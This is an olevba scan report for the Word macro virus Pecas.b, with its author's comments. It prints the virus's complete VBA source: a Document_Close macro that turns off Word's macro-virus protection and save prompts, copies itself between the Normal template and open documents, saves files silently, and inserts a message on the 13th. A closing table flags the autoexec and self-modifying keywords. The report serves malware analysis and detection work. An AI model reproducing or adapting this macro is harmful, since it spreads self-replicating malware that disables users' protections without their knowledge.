olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pecas.b-4123189c8261e5f30b90f6ef4ab132efef255a25
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Pecas.cls 
in file: Virus.MSWord.Pecas.b-4123189c8261e5f30b90f6ef4ab132efef255a25 - OLE stream: 'Macros/VBA/Pecas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




'by morris "vegueta"
'pequitas es mi novia
'mi viejo amigo " goto"
'd1
'este virus tiene un bug en mi siguiente version lo solucionare
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
Options.ConfirmConversions = (1 - 1)
Set plan = NormalTemplate.VBProject.VBComponents.Item(1)
Set activ = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = NormalTemplate.VBProject.VBComponents(1).CodeModule
bandera = 0
paso2:
cont = activ.CodeModule.countoflines
cont1 = plan.CodeModule.countoflines
var = plan.Name
If var = "Pecas" Then
  If activ.Name <> "Pecas" Then
   activ.CodeModule.DeleteLines 1, cont
    activ.CodeModule.InsertLines 1, temp.lines(1, cont1)
    activ.Name = plan.Name
      If bandera = 0 Then
      If InStr(1, ActiveDocument.Name, "Document") = 0 Then
        If Day(Now) = 13 Then Selection.TypeText "pequitas te amo"
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       Else
       ActiveDocument.Saved = True
      End If
      End If
    End If
End If
bandera = bandera + 1
If bandera > 1 Then
Application.ScreenUpdating = False
Exit Sub
End If
Set activ = NormalTemplate.VBProject.VBComponents.Item(1)
Set plan = ActiveDocument.VBProject.VBComponents.Item(1)
Set temp = ActiveDocument.VBProject.VBComponents(1).CodeModule

GoTo paso2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

